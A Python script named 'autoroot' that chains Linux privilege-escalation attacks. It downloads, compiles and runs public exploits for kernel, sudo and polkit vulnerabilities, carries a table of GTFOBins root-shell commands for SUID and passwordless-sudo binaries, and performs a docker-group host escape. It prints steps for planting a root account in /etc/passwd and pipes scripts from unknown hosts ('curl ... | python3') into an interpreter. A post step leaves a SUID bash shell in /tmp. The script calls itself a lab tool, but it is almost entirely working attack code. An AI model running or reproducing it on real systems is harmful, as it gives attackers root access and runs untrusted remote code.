#!/usr/bin/env python3
"""
autoroot - lab privilege-escalation runner.

Runs a set of public Linux privesc exploits in order, after basic
environment checks.  It is a dispatcher, not a magic root: each exploit
still depends on the exact kernel/distro/config, and a child process
cannot elevate the parent shell.  Run it on a disposable lab VM.

Usage:
  python3 autoroot.py --list
  python3 autoroot.py --yes
  python3 autoroot.py --yes --only pwnkit
  python3 autoroot.py --yes --allow-untrusted --labs
"""

from __future__ import annotations

import argparse
import os
import platform
import re
try:
    import grp
    import pwd
except ImportError:  # non-Linux development host
    grp = None
    pwd = None
import shlex
import shutil
import stat
import subprocess
import sys
import tempfile
import textwrap
import time
from dataclasses import dataclass, field

# ---------------------------------------------------------------------------
# terminal
# ---------------------------------------------------------------------------

COLOR = sys.stdout.isatty()


def paint(text: str, code: str) -> str:
    return f"\033[{code}m{text}\033[0m" if COLOR else text


def ok(text: str) -> str:
    return paint(text, "92")


def bad(text: str) -> str:
    return paint(text, "91")


def warn(text: str) -> str:
    return paint(text, "93")


def info(text: str) -> str:
    return paint(text, "96")


def bold(text: str) -> str:
    return paint(text, "1")


def log(text: str) -> None:
    print(text, flush=True)


# ---------------------------------------------------------------------------
# environment
# ---------------------------------------------------------------------------

WORK = ""
CC = "gcc"
_COMPILER_CHECKED = False
TIMEOUT = int(os.environ.get("AUTOROOT_TIMEOUT", "45"))
DRY = False


def mount_options(path: str) -> str:
    best = None
    try:
        with open("/proc/mounts", encoding="utf-8", errors="replace") as fh:
            for line in fh:
                parts = line.split()
                if len(parts) >= 4 and path.startswith(parts[1]):
                    if best is None or len(parts[1]) > len(best[0]):
                        best = (parts[1], parts[3])
    except OSError:
        pass
    return best[1] if best else ""


def find_workdir() -> str:
    candidates = []
    if os.environ.get("AUTOROOT_WORK"):
        candidates.append(os.environ["AUTOROOT_WORK"])
    home = os.path.expanduser("~")
    candidates += [
        os.path.join(home, ".cache", "autoroot"),
        "/dev/shm/autoroot",
        "/var/tmp/autoroot",
        "/tmp/autoroot",
    ]
    for base in candidates:
        try:
            os.makedirs(base, mode=0o700, exist_ok=True)
            if not os.access(base, os.W_OK | os.X_OK):
                continue
            opts = mount_options(base)
            if "noexec" in opts:
                continue
            path = tempfile.mkdtemp(prefix="run.", dir=base)
            os.chmod(path, 0o700)
            return path
        except OSError:
            continue
    # Last resort: a writable dir even if noexec (scripts can still run).
    return tempfile.mkdtemp(prefix="autoroot.")


def install_packages() -> bool:
    """Try to install a compiler/tools using passwordless sudo only."""
    if not shutil.which("sudo"):
        return False
    plans = []
    if shutil.which("apt-get"):
        plans.append(["sudo", "-n", "apt-get", "update"])
        plans.append(["sudo", "-n", "apt-get", "install", "-y",
                      "gcc", "build-essential", "git", "curl", "tar", "make"])
    elif shutil.which("dnf"):
        plans.append(["sudo", "-n", "dnf", "install", "-y",
                      "gcc", "make", "git", "curl", "tar"])
    elif shutil.which("yum"):
        plans.append(["sudo", "-n", "yum", "install", "-y",
                      "gcc", "make", "git", "curl", "tar"])
    elif shutil.which("apk"):
        plans.append(["sudo", "-n", "apk", "add", "--no-cache",
                      "gcc", "musl-dev", "make", "git", "curl", "tar"])
    elif shutil.which("pacman"):
        plans.append(["sudo", "-n", "pacman", "-Sy", "--noconfirm",
                      "gcc", "make", "git", "curl", "tar"])
    elif shutil.which("zypper"):
        plans.append(["sudo", "-n", "zypper", "install", "-y",
                      "gcc", "make", "git", "curl", "tar"])

    for cmd in plans:
        try:
            rc = subprocess.run(cmd, timeout=180).returncode
            if rc == 0 and (shutil.which("gcc") or shutil.which("cc")
                            or shutil.which("clang")):
                return True
        except (OSError, subprocess.TimeoutExpired):
            continue
    return False


def ensure_compiler() -> bool:
    global CC, _COMPILER_CHECKED
    if _COMPILER_CHECKED:
        return bool(shutil.which(CC))
    _COMPILER_CHECKED = True
    for candidate in ("gcc", "cc", "clang", "tcc"):
        if shutil.which(candidate):
            CC = candidate
            log(ok(f"  compiler: {CC}"))
            return True
    log(warn("  no C compiler; trying package manager (sudo -n)"))
    if install_packages():
        for candidate in ("gcc", "cc", "clang", "tcc"):
            if shutil.which(candidate):
                CC = candidate
                log(ok(f"  compiler installed: {CC}"))
                return True
    log(bad("  compiler unavailable; compile-based modules will skip"))
    return False


def ensure_tools() -> None:
    missing = [t for t in ("git", "curl", "tar", "make") if not shutil.which(t)]
    if missing:
        log(warn(f"  missing tools: {', '.join(missing)}; trying install"))
        install_packages()



def sh(cmd: str, desc: str = "", cwd: str | None = None,
       timeout: int | None = None) -> int:
    if desc:
        log(f"    {desc}")
    log(f"      $ {cmd}")
    if DRY:
        return 0

    def _run(command: str) -> int:
        try:
            return subprocess.run(
                ["bash", "-c", command],
                cwd=cwd or WORK,
                timeout=timeout if timeout is not None else TIMEOUT,
            ).returncode
        except subprocess.TimeoutExpired:
            log(bad(f"      timeout after {timeout or TIMEOUT}s"))
            return 124
        except FileNotFoundError as exc:
            log(bad(f"      {exc}"))
            return 127

    rc = _run(cmd)
    if rc == 126 and cmd.lstrip().startswith("./"):
        token = cmd.split()[0]
        src = os.path.join(cwd or WORK, token)
        if os.path.exists(src):
            for base in (os.path.expanduser("~/.cache/autoroot-exec"),
                         "/dev/shm/autoroot-exec"):
                try:
                    os.makedirs(base, mode=0o700, exist_ok=True)
                    if "noexec" in mount_options(base):
                        continue
                    dst = os.path.join(base, os.path.basename(src))
                    shutil.copy2(src, dst)
                    os.chmod(dst, 0o755)
                    retry = cmd.replace(token, dst, 1)
                    log(warn(f"      noexec/permission retry: {retry}"))
                    rc = _run(retry)
                    if rc != 126:
                        break
                except OSError:
                    continue
    return rc


def have(cmd: str) -> bool:
    return shutil.which(cmd) is not None


def capture(cmd: str, cwd: str | None = None, timeout: int = 20) -> str:
    try:
        return subprocess.run(
            ["bash", "-c", cmd],
            cwd=cwd or WORK,
            capture_output=True,
            text=True,
            timeout=timeout,
        ).stdout.strip()
    except (OSError, subprocess.TimeoutExpired):
        return ""


def user_groups() -> set[str]:
    names = set()
    if grp is None or pwd is None:
        return names
    try:
        user = pwd.getpwuid(os.getuid()).pw_name
    except KeyError:
        user = os.environ.get("USER", "")
    for group in grp.getgrall():
        if user in group.gr_mem:
            names.add(group.gr_name)
    for gid in os.getgroups():
        try:
            names.add(grp.getgrgid(gid).gr_name)
        except KeyError:
            pass
    return names


def writable(path: str) -> bool:
    return os.access(path, os.W_OK)


def root() -> bool:
    return os.geteuid() == 0


def kernel_tuple():
    m = re.match(r"(\d+)\.(\d+)", platform.release())
    return (int(m.group(1)), int(m.group(2))) if m else (0, 0)


def in_kernel_range(low, high) -> bool:
    return low <= kernel_tuple() <= high


def os_release() -> dict:
    data = {}
    try:
        with open("/etc/os-release", encoding="utf-8", errors="replace") as fh:
            for line in fh:
                if "=" in line:
                    k, v = line.rstrip().split("=", 1)
                    data[k] = v.strip('"')
    except OSError:
        pass
    return data


def distro_id() -> str:
    return os_release().get("ID", "").lower()


def has_suid(path: str | None) -> bool:
    if not path:
        return False
    try:
        return bool(os.stat(path).st_mode & stat.S_ISUID)
    except OSError:
        return False


def packagekit_present() -> bool:
    if not have("dpkg"):
        return False
    try:
        out = subprocess.run(["dpkg", "-l"], capture_output=True, text=True,
                             timeout=15).stdout.lower()
        return "packagekit" in out
    except (OSError, subprocess.TimeoutExpired):
        return False


def openvswitch_present() -> bool:
    if have("ovs-vsctl"):
        return True
    try:
        return "openvswitch" in open("/proc/modules", encoding="utf-8").read()
    except OSError:
        return False


# ---------------------------------------------------------------------------
# modules
# ---------------------------------------------------------------------------

@dataclass
class Module:
    key: str
    title: str
    check: str
    fn: callable
    untrusted: bool = False
    post: bool = False
    lab: bool = False
    ran: bool = False
    skipped: bool = False
    failed: bool = False


MODULES: list[Module] = []


def module(key, title, check, untrusted=False, post=False, lab=False):
    def deco(fn):
        MODULES.append(Module(key, title, check, fn, untrusted, post, lab))
        return fn
    return deco


@module("pwnkit", "PwnKit (CVE-2021-4034)", "pkexec SUID")
def m_pwnkit():
    pk = shutil.which("pkexec")
    if not pk or not has_suid(pk):
        log(warn("      pkexec yok veya SUID degil"))
        return False
    if not ensure_compiler():
        log(warn("      gcc yok"))
        return False
    sh("curl -fsSL https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/refs/heads/main/cve-2021-4034-poc.c -o pwn.c", "download")
    sh(f"{CC} pwn.c -o pwn", "compile")
    sh("./pwn", "run")
    return True


@module("dirtypipe", "Dirty Pipe (CVE-2022-0847)", "kernel 5.8-5.16")
def m_dirtypipe():
    if not in_kernel_range((5, 8), (5, 16)):
        log(warn(f"      kernel {platform.release()} aralikta degil"))
        return False
    if not have("git") or not ensure_compiler():
        log(warn("      git/gcc yok"))
        return False
    sh("git clone --depth 1 https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit.git dirtypipe", "clone")
    sh(f"{CC} exploit.c -o exploit", "compile", cwd=os.path.join(WORK, "dirtypipe"))
    sh("./exploit", "run", cwd=os.path.join(WORK, "dirtypipe"))
    return True


@module("gameover", "GameOver(lay) (CVE-2023-2640/32629)", "Ubuntu + OverlayFS")
def m_gameover():
    if distro_id() not in ("ubuntu", "linuxmint"):
        log(warn(f"      distro {distro_id() or 'unknown'} uygun degil"))
        return False
    sh("curl -fsSL https://raw.githubusercontent.com/g1vi/CVE-2023-2640-CVE-2023-32629/main/exploit.sh -o gameover.sh", "download")
    sh("chmod +x gameover.sh", "chmod")
    sh("./gameover.sh", "run")
    return True


@module("overlayfs", "OverlayFS (CVE-2023-0386)", "overlayfs + FUSE")
def m_overlayfs():
    try:
        fs = open("/proc/filesystems", encoding="utf-8").read()
    except OSError:
        fs = ""
    if "overlay" not in fs:
        log(warn("      overlayfs yok"))
        return False
    if not have("git") or not ensure_compiler():
        log(warn("      git/gcc yok"))
        return False
    sh("git clone --depth 1 https://github.com/xkaneiki/CVE-2023-0386.git overlayfs", "clone")
    sh(f"{CC} -o exp exp.c -lcap", "compile", cwd=os.path.join(WORK, "overlayfs"))
    sh("./exp", "run", cwd=os.path.join(WORK, "overlayfs"))
    return True


@module("dirtyfrag", "DirtyFrag", "kernel 6.1-6.6")
def m_dirtyfrag():
    if not in_kernel_range((6, 1), (6, 6)):
        log(warn(f"      kernel {platform.release()} aralikta degil"))
        return False
    if not have("git") or not ensure_compiler():
        log(warn("      git/gcc yok"))
        return False
    sh("git clone --depth 1 https://github.com/V4bel/dirtyfrag.git dirtyfrag", "clone")
    sh(f"{CC} -O0 -Wall -o exp exp.c -lutil", "compile", cwd=os.path.join(WORK, "dirtyfrag"))
    sh("./exp", "run", cwd=os.path.join(WORK, "dirtyfrag"))
    return True


@module("fragnesia", "FragNesia", "kernel 5.19-6.8")
def m_fragnesia():
    if not in_kernel_range((5, 19), (6, 8)):
        log(warn(f"      kernel {platform.release()} aralikta degil"))
        return False
    if not have("git") or not ensure_compiler():
        log(warn("      git/gcc yok"))
        return False
    sh("git clone --depth 1 https://github.com/v12-security/pocs.git pocs", "clone")
    d = os.path.join(WORK, "pocs", "fragnesia")
    sh(f"{CC} -o exp fragnesia.c", "compile", cwd=d)
    sh("./exp", "run", cwd=d)
    return True


@module("packagekit", "PackageKit RCE (CVE-2026-41651)", "PackageKit installed")
def m_packagekit():
    if not packagekit_present():
        log(warn("      PackageKit yok"))
        return False
    if not have("git"):
        log(warn("      git yok"))
        return False
    sh("git clone --depth 1 https://github.com/Vozec/CVE-2026-41651.git pk", "clone")
    d = os.path.join(WORK, "pk")
    sh("chmod +x cve-2026-41651", "chmod", cwd=d)
    sh("./cve-2026-41651", "run", cwd=d)
    return True


@module("ovswrap", "OVSwrap", "Open vSwitch")
def m_ovswrap():
    if not openvswitch_present():
        log(warn("      Open vSwitch yok"))
        return False
    if not have("git"):
        log(warn("      git yok"))
        return False
    sh("git clone --depth 1 https://github.com/manizada/OVSwrap.git ovswrap", "clone")
    sh("python3 ovswrap-poc.py", "run", cwd=os.path.join(WORK, "ovswrap"))
    return True


@module("cve2026_46300", "CVE-2026-46300 (unknown)", "public repo, unverified")
def m_46300():
    sh("git clone --depth 1 https://github.com/ExploitEoom/CVE-2026-46300.git cve46300", "clone")
    d = os.path.join(WORK, "cve46300")
    sh("chmod +x exploit", "chmod", cwd=d)
    sh("./exploit", "run", cwd=d)
    return True


@module("diagspill", "DiagSpill", "repo, unknown")
def m_diagspill():
    sh("curl -fsSL https://github.com/manizada/DiagSpill/archive/refs/heads/main.tar.gz -o diagspill.tar.gz", "download")
    sh("tar xzf diagspill.tar.gz", "extract")
    d = os.path.join(WORK, "DiagSpill-main")
    if os.path.isdir(d):
        sh("make || true", "make", cwd=d)
        sh("if [ -x ./exploit ]; then ./exploit; elif [ -x ./run.sh ]; then ./run.sh; else ls -la; fi", "run", cwd=d)
    return True


@module("tunderflow", "TUNderflow", "repo, unknown")
def m_tunderflow():
    sh("curl -fsSL https://github.com/manizada/TUNderflow/archive/refs/heads/main.tar.gz -o tunderflow.tar.gz", "download")
    sh("tar xzf tunderflow.tar.gz", "extract")
    d = os.path.join(WORK, "TUNderflow-main")
    if os.path.isdir(d):
        sh("make || true", "make", cwd=d)
        sh("if [ -x ./exploit ]; then ./exploit; elif [ -x ./run.sh ]; then ./run.sh; else ls -la; fi", "run", cwd=d)
    return True


@module("cve2026_68138", "CVE-2026-68138", "repo, unknown", lab=True)
def m_68138():
    sh("git clone --depth 1 https://github.com/aramosf/CVE-2026-68138.git cve68138", "clone")
    d = os.path.join(WORK, "cve68138")
    sh("chmod +x build.sh", "chmod", cwd=d)
    sh("./build.sh", "build", cwd=d)
    sh("if [ -x ./exploit ]; then ./exploit; else ls -la; fi", "run", cwd=d)
    return True


@module("dirtydecrypt", "DirtyDecrypt (CVE-2026-31635)", "repo, unknown")
def m_dirtydecrypt():
    if not ensure_compiler():
        return False
    sh("git clone --depth 1 https://github.com/0xBlackash/DirtyDecrypt.git dirtydecrypt", "clone")
    d = os.path.join(WORK, "dirtydecrypt")
    sh(f"{CC} -O2 -static -pthread CVE-2026-31635.c -o DirtyDecrypt", "compile", cwd=d)
    sh("./DirtyDecrypt", "run", cwd=d)
    return True


@module("cybermeowfia", "CyberMeowfia (CVE-2026-52923)", "RHEL 6.12 lab")
def m_cybermeowfia():
    sh("git clone --depth 1 https://github.com/NebuSec/CyberMeowfia.git cybermeowfia", "clone")
    d = os.path.join(WORK, "cybermeowfia", "security-research",
                     "Linux-CVE-2026-52923-RHEL-6.12.0-211.7.3.el10_2")
    if not os.path.isdir(d):
        log(warn("      expected subdirectory not found"))
        return False
    sh("make", "make", cwd=d)
    sh("./exploit", "run", cwd=d)
    return True


@module("cve2026_68398", "CVE-2026-68398", "repo, unknown")
def m_68398():
    if not ensure_compiler():
        return False
    sh("git clone --depth 1 https://github.com/aramosf/cve-2026-68398.git cve68398", "clone")
    d = os.path.join(WORK, "cve68398")
    sh(f"{CC} -O2 exploit.c kaslr_prefetch.c -o exploit -lpthread", "compile", cwd=d)
    sh("./exploit", "run", cwd=d)
    return True


@module("pwnkit2", "PwnKit (second repo)", "pkexec SUID")
def m_pwnkit2():
    pk = shutil.which("pkexec")
    if not pk or not has_suid(pk):
        log(warn("      pkexec yok veya SUID degil"))
        return False
    if not ensure_compiler():
        return False
    sh("git clone --depth 1 https://github.com/Rvn0xsy/CVE-2021-4034.git pwnkit2", "clone")
    d = os.path.join(WORK, "pwnkit2")
    sh(f"{CC} cve-2021-4034.c -o exp", "compile", cwd=d)
    sh("./exp", "run", cwd=d)
    return True


@module("cve2026_64600", "CVE-2026-64600", "repo, unknown")
def m_64600():
    if not ensure_compiler():
        return False
    sh("git clone --depth 1 https://github.com/Debajyoti0-0/CVE-2026-64600.git cve64600", "clone")
    d = os.path.join(WORK, "cve64600")
    sh(f"{CC} -o cve-2026-64600 cve-2026-64600.c -lm -lpthread", "compile", cwd=d)
    sh("./cve-2026-64600", "run", cwd=d)
    return True


GTFOBINS = {
    "bash": "{p} -p",
    "sh": "{p} -p",
    "dash": "{p} -p",
    "zsh": "{p} -p",
    "find": "{p} . -exec /bin/sh -p \\; -quit",
    "vim": "{p} -c ':!/bin/sh'",
    "vi": "{p} -c ':!/bin/sh'",
    "nvim": "{p} -c ':!/bin/sh'",
    "awk": "{p} 'BEGIN {system(\"/bin/sh\")}'",
    "gawk": "{p} 'BEGIN {system(\"/bin/sh\")}'",
    "mawk": "{p} 'BEGIN {system(\"/bin/sh\")}'",
    "perl": "{p} -e 'exec \"/bin/sh\";'",
    "python": "{p} -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
    "python3": "{p} -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
    "tar": "{p} -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
    "env": "{p} /bin/sh -p",
}


def find_suid() -> list[str]:
    out = capture(
        "find / -xdev -perm -4000 -type f 2>/dev/null | head -200",
        timeout=35,
    )
    return [line.strip() for line in out.splitlines() if line.strip()]


@module("suid_gtfobins", "SUID + GTFOBins", "SUID binaries")
def m_suid():
    paths = find_suid()
    if not paths:
        log(warn("      no SUID binaries found"))
        return False
    log(f"      {len(paths)} SUID binaries")
    for path in paths:
        name = os.path.basename(path)
        template = GTFOBINS.get(name)
        if not template:
            continue
        command = template.format(p=shlex.quote(path))
        log(ok(f"      {path} -> GTFOBins"))
        sh(command, "run SUID shell")
        return True
    log(warn("      no known GTFOBins SUID binary"))
    return False


@module("sudo_nopasswd", "sudo NOPASSWD + GTFOBins", "sudo -n -l")
def m_sudo():
    out = capture("sudo -n -l 2>&1", timeout=15)
    if not out or "NOPASSWD" not in out:
        log(warn("      no passwordless sudo entry"))
        return False
    log(out)
    for line in out.splitlines():
        if "NOPASSWD" not in line:
            continue
        spec = line.split("NOPASSWD:", 1)[1]
        for item in spec.split(","):
            path = item.strip().split()[0] if item.strip() else ""
            if not path:
                continue
            if path == "ALL":
                sh("sudo -n /bin/bash", "sudo ALL -> shell")
                return True
            name = os.path.basename(path)
            template = GTFOBINS.get(name)
            if template:
                command = "sudo -n " + template.format(p=shlex.quote(path))
                log(ok(f"      {path} -> GTFOBins"))
                sh(command, "run sudo shell")
                return True
    log(warn("      NOPASSWD entries found, but no known GTFOBins"))
    return False


@module("docker_group", "Docker group escape", "docker group")
def m_docker():
    if "docker" not in user_groups() or not have("docker"):
        log(warn("      not in docker group / docker missing"))
        return False
    image = capture(
        "docker images --format '{{.Repository}}:{{.Tag}}' 2>/dev/null "
        "| grep -v '<none>' | head -1",
        timeout=20,
    )
    if not image:
        log(warn("      no local image; pulling alpine"))
        sh("docker pull alpine", "pull alpine", timeout=120)
        image = "alpine"
    command = (
        f"docker run --rm -it -v /:/mnt --entrypoint /bin/sh "
        f"{shlex.quote(image)} -c 'chroot /mnt /bin/bash'"
    )
    sh(command, "docker host escape")
    return True


@module("lxd_group", "LXD group escape", "lxd group")
def m_lxd():
    if "lxd" not in user_groups() or not have("lxc"):
        log(warn("      not in lxd group / lxc missing"))
        return False
    log(warn("      lxd group found; manual sequence:"))
    log("        lxc init ubuntu:22.04 c -c security.privileged=true")
    log("        lxc config device add c host disk source=/ path=/mnt")
    log("        lxc start c")
    log("        lxc exec c chroot /mnt /bin/sh")
    return True


@module("writable_passwd", "writable /etc/passwd or /etc/shadow", "write check")
def m_passwd():
    if writable("/etc/passwd"):
        log(bad("      /etc/passwd is writable"))
        log("        cp /etc/passwd /tmp/passwd.bak")
        log("        openssl passwd -1 -salt x password")
        log("        echo 'autoroot:$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd")
        log("        su autoroot")
        return True
    if writable("/etc/shadow"):
        log(bad("      /etc/shadow is writable"))
        log("        replace root hash with a known one, then su root")
        return True
    log(warn("      /etc/passwd and /etc/shadow are not writable"))
    return False


@module("writable_root_jobs", "writable cron/systemd/logrotate", "write check")
def m_jobs():
    paths = [
        "/etc/crontab", "/etc/cron.d", "/etc/cron.daily", "/etc/cron.hourly",
        "/etc/cron.weekly", "/etc/cron.monthly", "/var/spool/cron",
        "/etc/systemd/system", "/etc/logrotate.d", "/etc/logrotate.conf",
    ]
    found = []
    for path in paths:
        if os.path.exists(path) and writable(path):
            found.append(path)
    extra = capture(
        "find /etc/cron* /etc/systemd/system /etc/logrotate.d "
        "-writable -type f 2>/dev/null | head -50",
        timeout=20,
    )
    for line in extra.splitlines():
        if line.strip() and line.strip() not in found:
            found.append(line.strip())
    if not found:
        log(warn("      no writable root job files"))
        return False
    log(bad("      writable root job paths:"))
    for path in found:
        log(f"        {path}")
    log("        add a root command to one of these and wait for the job")
    return True


@module("sudo_baron", "sudo Baron Samedit (CVE-2021-3156)", "sudo < 1.9.5p2")
def m_baron():
    version = capture("sudo -V 2>/dev/null | head -1")
    if not version:
        log(warn("      sudo not found"))
        return False
    log(f"      {version}")
    if not re.search(r"1\.(8\.|9\.[0-5])", version):
        log(warn("      sudo version not in the vulnerable range"))
        return False
    if not have("git") or not have("make"):
        return False
    sh("git clone --depth 1 https://github.com/blasty/CVE-2021-3156.git baron", "clone")
    d = os.path.join(WORK, "baron")
    sh("make", "make", cwd=d)
    sh("ls -la", "list", cwd=d)
    sh("./sudo-hax-me-a-sandwich", "run", cwd=d)
    return True


@module("polkit_3560", "polkit (CVE-2021-3560)", "polkit/pkexec")
def m_polkit():
    if not have("pkexec"):
        log(warn("      pkexec not found"))
        return False
    sh("git clone --depth 1 https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation.git polkit", "clone")
    d = os.path.join(WORK, "polkit")
    sh("chmod +x exploit.sh 2>/dev/null; bash exploit.sh", "run", cwd=d)
    return True


@module("looney", "Looney Tunables (CVE-2023-4911)", "glibc 2.34-2.38")
def m_looney():
    version = capture("ldd --version 2>/dev/null | head -1")
    log(f"      {version or 'glibc unknown'}")
    if not have("git") or not ensure_compiler():
        return False
    sh("git clone --depth 1 https://github.com/leesh3288/CVE-2023-4911.git looney", "clone")
    d = os.path.join(WORK, "looney")
    sh(f"{CC} exp.c -o exp", "compile", cwd=d)
    sh("./exp", "run", cwd=d)
    return True


@module("nft_1086", "nftables (CVE-2024-1086)", "kernel 5.14-6.6")
def m_nft():
    if not in_kernel_range((5, 14), (6, 6)):
        log(warn(f"      kernel {platform.release()} outside range"))
        return False
    if not have("git") or not have("make"):
        return False
    sh("git clone --depth 1 https://github.com/Notselwyn/CVE-2024-1086.git nft1086", "clone")
    d = os.path.join(WORK, "nft1086")
    sh("make", "make", cwd=d)
    sh("./exploit", "run", cwd=d)
    return True


@module("cve_2021_22555", "netfilter (CVE-2021-22555)", "kernel 2.6-5.12")
def m_22555():
    if not in_kernel_range((2, 6), (5, 12)):
        log(warn(f"      kernel {platform.release()} outside range"))
        return False
    if not have("git") or not have("make"):
        return False
    sh("git clone --depth 1 https://github.com/google/security-research.git gsr", "clone")
    d = os.path.join(WORK, "gsr", "pocs", "linux", "cve-2021-22555")
    if not os.path.isdir(d):
        log(warn("      expected path not found"))
        return False
    sh("make", "make", cwd=d)
    sh("./exploit", "run", cwd=d)
    return True


@module("cve_2021_3493", "Ubuntu overlayfs (CVE-2021-3493)", "Ubuntu kernel")
def m_3493():
    if distro_id() not in ("ubuntu", "linuxmint"):
        log(warn("      not Ubuntu"))
        return False
    if not have("git") or not ensure_compiler():
        return False
    sh("git clone --depth 1 https://github.com/briskets/CVE-2021-3493.git cve3493", "clone")
    d = os.path.join(WORK, "cve3493")
    sh(f"{CC} exploit.c -o exploit", "compile", cwd=d)
    sh("./exploit", "run", cwd=d)
    return True


@module("cve_2022_0185", "fs_context (CVE-2022-0185)", "kernel 5.4-5.16")
def m_0185():
    if not in_kernel_range((5, 4), (5, 16)):
        log(warn(f"      kernel {platform.release()} outside range"))
        return False
    if not have("git") or not have("make"):
        return False
    sh("git clone --depth 1 https://github.com/Crusaders-of-Rust/CVE-2022-0185.git cve0185", "clone")
    d = os.path.join(WORK, "cve0185")
    sh("make", "make", cwd=d)
    sh("./exploit", "run", cwd=d)
    return True


@module("cve_2022_2588", "cls_route (CVE-2022-2588)", "kernel 5.8-5.19")
def m_2588():
    if not in_kernel_range((5, 8), (5, 19)):
        log(warn(f"      kernel {platform.release()} outside range"))
        return False
    if not have("git") or not have("make"):
        return False
    sh("git clone --depth 1 https://github.com/Markakd/CVE-2022-2588.git cve2588", "clone")
    d = os.path.join(WORK, "cve2588")
    sh("make", "make", cwd=d)
    sh("./exp", "run", cwd=d)
    return True


@module("untrusted_copyfail", "copy.fail remote script", "UNTRUSTED", untrusted=True)
def m_copyfail():
    if not UNTRUSTED:
        log(warn("      untrusted; use --allow-untrusted"))
        return False
    sh("curl -fsSL https://copy.fail/exp | python3", "run remote payload")
    return True


@module("untrusted_softechnology", "softechnology.biz remote script", "UNTRUSTED", untrusted=True)
def m_softechnology():
    if not UNTRUSTED:
        log(warn("      untrusted; use --allow-untrusted"))
        return False
    sh("curl -fsSL https://softechnology.biz/raw/OzJAt2aCfQ | python3", "run remote payload")
    return True


@module("mariadb_lab", "MariaDB 13 RCE lab", "docker lab, not privesc", lab=True)
def m_mariadb():
    if not have("docker"):
        log(warn("      docker yok"))
        return False
    sh("git clone --depth 1 https://github.com/dinosn/mariadb-13-rce-lab.git mariadb-lab", "clone")
    sh("docker compose up -d", "compose up", cwd=os.path.join(WORK, "mariadb-lab"))
    return True


@module("post_suid", "post: SUID bash", "only if already root", post=True)
def m_post():
    if not root():
        log(warn("      not root; post step skipped"))
        return False
    sh("cp /bin/bash /tmp/bash && chmod 4755 /tmp/bash", "create SUID bash")
    log(ok("      /tmp/bash -p"))
    return True


@module("recon", "recon", "always")
def m_recon():
    sh("id; echo; sudo -n -l 2>&1 | head -40; echo; uname -a; echo; cat /etc/os-release | head -8", "recon")
    return True


# ---------------------------------------------------------------------------
# runner
# ---------------------------------------------------------------------------

UNTRUSTED = False


def run_module(mod: Module) -> None:
    log("")
    log(bold(f"[{mod.key}] {mod.title}"))
    log(f"  check: {mod.check}")
    if mod.untrusted and not UNTRUSTED:
        log(warn("  skipped: untrusted (--allow-untrusted)"))
        mod.skipped = True
        return
    if mod.post and not root():
        log(warn("  skipped: post step requires root"))
        mod.skipped = True
        return
    try:
        mod.ran = True
        applicable = mod.fn()
        if applicable is False:
            mod.skipped = True
    except KeyboardInterrupt:
        raise
    except Exception as exc:  # noqa: BLE001
        mod.failed = True
        log(bad(f"  error: {exc}"))
    if root():
        log(ok("  current process is root"))
        if sys.stdin.isatty():
            log(ok("  opening root shell..."))
            os.execv("/bin/bash", ["bash", "-p"])


def main(argv=None) -> int:
    global DRY, TIMEOUT, UNTRUSTED, WORK
    p = argparse.ArgumentParser(
        description="autoroot - lab privilege-escalation runner")
    p.add_argument("--yes", "-y", action="store_true",
                   help="confirm running the modules")
    p.add_argument("--dry-run", action="store_true",
                   help="print commands without running them")
    p.add_argument("--allow-untrusted", action="store_true",
                   help="allow curl | python3 payloads from unknown hosts")
    p.add_argument("--labs", action="store_true",
                   help="include lab/service modules (docker etc.)")
    p.add_argument("--only", help="run a single module key")
    p.add_argument("--list", action="store_true",
                   help="list modules and exit")
    p.add_argument("--timeout", type=int, default=TIMEOUT,
                   help=f"per-command timeout (default: {TIMEOUT}s, 0 = none)")
    args = p.parse_args(argv)

    if args.list:
        high = {
            "suid_gtfobins", "sudo_nopasswd", "docker_group", "lxd_group",
            "writable_passwd", "writable_root_jobs",
        }
        ordered = sorted(MODULES, key=lambda m: (
            0 if m.key == "recon" else 1 if m.key in high else 2
        ))
        for mod in ordered:
            flags = []
            if mod.untrusted:
                flags.append("untrusted")
            if mod.post:
                flags.append("post")
            if mod.lab:
                flags.append("lab")
            suffix = f" [{'/'.join(flags)}]" if flags else ""
            log(f"  {mod.key:<24} {mod.title}{suffix}")
        return 0

    if platform.system() != "Linux":
        log(bad("autoroot: Linux target required"))
        return 2

    DRY = args.dry_run
    TIMEOUT = args.timeout if args.timeout > 0 else 10 ** 9
    UNTRUSTED = args.allow_untrusted
    WORK = find_workdir()
    os.chmod(WORK, 0o700)
    ensure_tools()
    ensure_compiler()

    selected = [m for m in MODULES if not args.only or m.key == args.only]
    if args.only and not selected:
        log(bad(f"unknown module: {args.only}"))
        return 2
    if not args.only:
        selected = [
            m for m in selected
            if (args.labs or not m.lab)
            and (args.allow_untrusted or not m.untrusted)
        ]
    high = {
        "suid_gtfobins", "sudo_nopasswd", "docker_group", "lxd_group",
        "writable_passwd", "writable_root_jobs",
    }
    selected.sort(key=lambda m: (
        0 if m.key == "recon" else 1 if m.key in high else 2
    ))

    log(bold("autoroot - lab privilege-escalation runner"))
    log(f"user   : {os.getuid()} ({os.environ.get('USER', '?')})")
    log(f"kernel : {platform.release()}")
    log(f"distro : {distro_id() or 'unknown'}")
    log(f"work   : {WORK}")
    log("")

    if root():
        log(ok("Already root; running recon only."))
        m_recon()
        return 0

    if not args.dry_run:
        log("")
        log(info("running all safe modules (untrusted/lab/post skipped)"))
        log("")

    for mod in selected:
        run_module(mod)

    log("")
    log(bold("SUMMARY"))
    for mod in selected:
        if mod.ran and not mod.skipped and not mod.failed:
            state = ok("ran")
        elif mod.skipped:
            state = warn("skipped")
        elif mod.failed:
            state = bad("failed")
        else:
            state = warn("not run")
        log(f"  {mod.key:<24} {state}")
    log("")
    if not root():
        log(warn("Parent process is still unprivileged. A child exploit "
                 "cannot elevate this shell."))
        log("Use a module that leaves a SUID shell or run the exploit "
            "interactively.")
    return 0


if __name__ == "__main__":
    sys.exit(main())


